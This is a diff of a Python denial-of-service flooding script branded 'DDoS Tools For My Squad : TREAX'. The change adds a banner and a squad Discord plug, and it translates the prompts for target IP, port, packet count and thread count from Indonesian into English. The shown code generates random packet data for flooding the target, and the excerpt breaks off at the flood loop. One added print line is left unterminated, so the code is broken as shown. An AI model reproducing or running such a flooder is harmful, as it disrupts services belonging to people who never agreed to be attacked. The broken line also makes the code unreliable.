@@ -6,13 +6,22 @@ import is
 import codecs, sys
 
 os.system("clear ") 
-print('''\033[94
+print('''\033[94 
+████████╗██████╗░███████╗░█████╗░██╗░░██╗
+╚══██╔══╝██╔══██╗██╔════╝██╔══██╗╚██╗██╔╝
+░░░██║░░░██████╔╝█████╗░░███████║░╚███╔╝░
+░░░██║░░░██╔══██╗██╔══╝░░██╔══██║░██╔██╗░
+░░░██║░░░██║░░██║███████╗██║░░██║██╔╝╚██╗
+░░░╚═╝░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝ \033[94''')
+print(" DDoS Tools For My Squad : TREAX ") 
+print(" Join to my squad discord link ")
+print(" TREAX SQUAD :
     
-ip = str(input("  Ip:"))
-port = int(input(" Port:"))
-choice = str(input(" SERIUS MAU NYERANG? (y/n):"))
-times = int(input(" Paket Nya Mau Berapa:"))
-threads = int(input(" Pelor Nya Tembakin Berapa:"))
+ip = str(input("  IP Target :"))
+port = int(input(" PORT Target :"))
+choice = str(input(" Are You Seriously? (y/n) :"))
+times = int(input(" Times :"))
+threads = int(input(" Threads :"))
 def run():
 	data = random._urandom(1000)
 	i = random.choice(("[+]","[-]","[=]"))
